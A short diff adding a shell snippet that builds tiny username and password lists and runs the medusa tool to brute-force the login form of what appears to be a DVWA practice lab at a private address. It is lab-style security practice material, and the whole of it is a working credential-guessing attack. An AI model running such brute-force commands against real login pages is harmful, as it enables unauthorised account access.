@@ -1,0 +1,6 @@
+echo "user\nmsfadmin\nadmin\nroot" > users.txt
+echo -e "12345\npassword\nqwerty\nmsfadmin" > pass.txt
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
+-m PAGE: '/dvwa/login.php' \
+-m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
+-n 'FAIL=Login failed' -t 6
